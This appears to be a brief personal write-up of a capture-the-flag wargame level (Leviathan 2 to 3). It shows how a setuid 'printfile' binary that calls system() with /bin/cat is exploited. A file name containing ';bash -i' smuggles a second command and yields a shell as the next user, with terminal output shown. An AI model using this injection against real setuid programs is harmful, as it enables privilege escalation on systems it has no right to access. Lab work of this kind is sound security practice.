#3: Wow this one was harder... took me while and went into a bit of a gdb rabbit hole...
# Basically, we need to exploit the system() function that is being used along with /bin/cat to RCE an interactive shell and get the falg that way:
#
# leviathan2@leviathan:~$ touch /tmp/'rce;bash -i'
# leviathan2@leviathan:~$ ./printfile /tmp/'rce;bash -i'
# /bin/cat: /tmp/rce: No such file or directory
# leviathan3@leviathan:~$ ls -la
# total 28
# drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
# drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
# -rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
# -rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
# -r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
# -rw-r--r--  1 root       root        675 May 15  2017 .profile
